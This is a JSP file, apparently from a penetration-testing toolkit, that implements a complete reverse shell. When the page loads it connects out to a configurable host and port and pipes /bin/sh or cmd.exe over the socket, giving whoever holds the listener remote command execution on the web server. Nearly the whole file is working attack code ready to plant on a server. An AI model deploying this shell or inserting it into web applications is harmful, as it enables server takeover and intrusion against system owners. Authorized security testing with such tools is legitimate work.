<%@page import="java.net.SocketTimeoutException"%>
<%@page import="java.util.Arrays"%>
<%@page import="java.net.Socket"%>
<%@page import="java.io.IOException"%>
<%@page import="java.io.OutputStream"%>
<%@page import="java.io.InputStream"%>
<%@page import="java.net.InetSocketAddress"%>

<%-- Copyright (c) 2021 Ivan Šincek --%>
<%-- v3.0 --%>
<%-- Requires Java SE v8 or greater, JDK v8 or greater, and Java EE v5 or greater. --%>
<%-- Works on Linux OS, macOS, and Windows OS. --%>

<%!
    public class ReverseShell {

        private InetSocketAddress addr    = null;
        private String            os      = null;
        private String            shell   = null;
        private byte[]            buffer  = null;
        private int               clen    = 0;
        private boolean           error   = false;
        private String            message = null;

        public ReverseShell(String addr, int port) {
            this.addr = new InetSocketAddress(addr, port);
        }

        private boolean detect() {
            boolean detected = true;
            this.os = System.getProperty("os.name").toUpperCase();
            if (this.os.contains("LINUX") || this.os.contains("MAC")) {
                this.os      = "LINUX";
                this.shell   = "/bin/sh";
            } else if (this.os.contains("WIN")) {
                this.os      = "WINDOWS";
                this.shell   = "cmd.exe";
            } else {
                detected     = false;
                this.message = "SYS_ERROR: Underlying operating system is not supported, program will now exit...\n";
            }
            return detected;
        }

        private String getMessage() {
            return this.message;
        }

        // strings in Java are immutable, so we need to avoid using them to minimize the data in memory
        private void brw(InputStream input, OutputStream output, String iname, String oname) {
            int bytes = 0;
            try {
                do {
                    if (this.os.equals("WINDOWS") && iname.equals("STDOUT") && this.clen > 0) {
                        // for some reason Windows OS pipes STDIN into STDOUT
                        // we do not like that
                        // we need to discard the data from the stream
                        do {
                            bytes = input.read(this.buffer, 0, this.clen >= this.buffer.length ? this.buffer.length : this.clen);
                            this.clen -= this.clen >= this.buffer.length ? this.buffer.length : this.clen;
                        } while (bytes > 0 && this.clen > 0);
                    } else {
                        bytes = input.read(this.buffer, 0, this.buffer.length);
                        if (bytes > 0) {
                            output.write(this.buffer, 0, bytes);
                            output.flush();
                            if (this.os.equals("WINDOWS") && oname.equals("STDIN")) {
                                this.clen += bytes;
                            }
                        } else if (iname.equals("SOCKET")) {
                            this.error   = true;
                            this.message = "SOC_ERROR: Shell connection has been terminated\n";
                        }
                    }
                } while (input.available() > 0);
            } catch (SocketTimeoutException ex) {} catch (IOException ex) {
                this.error   = true;
                this.message = String.format("STRM_ERROR: Cannot read from %s or write to %s, program will now exit...\n", iname, oname);
            }
        }

        public void run() {
            if (this.detect()) {
                Socket       client  = null;
                OutputStream socin   = null;
                InputStream  socout  = null;

                Process      process = null;
                OutputStream stdin   = null;
                InputStream  stdout  = null;
                InputStream  stderr  = null;

                try {
                    client = new Socket();
                    client.setSoTimeout(100);
                    client.connect(this.addr);
                    socin  = client.getOutputStream();
                    socout = client.getInputStream();

                    this.buffer = new byte[1024];

                    process = new ProcessBuilder(this.shell).redirectInput(ProcessBuilder.Redirect.PIPE).redirectOutput(ProcessBuilder.Redirect.PIPE).redirectError(ProcessBuilder.Redirect.PIPE).start();
                    stdin   = process.getOutputStream();
                    stdout  = process.getInputStream();
                    stderr  = process.getErrorStream();

                    do {
                        if (!process.isAlive()) {
                            this.message = "PROC_ERROR: Shell process has been terminated\n"; break;
                        }
                        this.brw(socout, stdin, "SOCKET", "STDIN");
                        if (stderr.available() > 0) { this.brw(stderr, socin, "STDERR", "SOCKET"); }
                        if (stdout.available() > 0) { this.brw(stdout, socin, "STDOUT", "SOCKET"); }
                    } while (!this.error);
                } catch (IOException ex) {
                    this.message = String.format("ERROR: %s\n", ex.getMessage());
                } finally {
                    if (stdin   != null) { try { stdin.close() ; } catch (IOException ex) {} }
                    if (stdout  != null) { try { stdout.close(); } catch (IOException ex) {} }
                    if (stderr  != null) { try { stderr.close(); } catch (IOException ex) {} }
                    if (process != null) { process.destroy(); }

                    if (socin  != null) { try { socin.close() ; } catch (IOException ex) {} }
                    if (socout != null) { try { socout.close(); } catch (IOException ex) {} }
                    if (client != null) { try { client.close(); } catch (IOException ex) {} }

                    if (this.buffer != null) { Arrays.fill(this.buffer, (byte)0); }
                }
            }
        }
    }
%>

<%@page contentType="text/html" pageEncoding="UTF-8"%>

<%
    out.print("<pre>");
    // change the host address and/or port number as necessary
    ReverseShell sh = new ReverseShell("127.0.0.1", 9000);
    sh.run();
    if (sh.getMessage() != null) { out.print(sh.getMessage()); }
    sh = null;
    System.gc();
    out.print("</pre>");
%>
